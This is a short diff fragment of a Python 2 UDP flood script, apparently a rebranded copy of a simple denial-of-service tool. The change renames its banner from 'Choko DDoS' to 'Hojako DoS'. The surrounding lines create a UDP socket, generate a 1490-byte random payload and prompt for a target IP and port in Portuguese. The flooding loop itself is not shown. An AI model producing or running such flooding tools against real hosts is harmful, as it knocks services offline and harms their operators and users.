@@ -8,7 +8,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 time.sleep(2)
 os.system("clear")
-print "Choko DDoS"
+print "Hojako DoS"
 ip = raw_input("IP do alvo =  ")
 port = input("Porta =  ")
 os.system("clear")
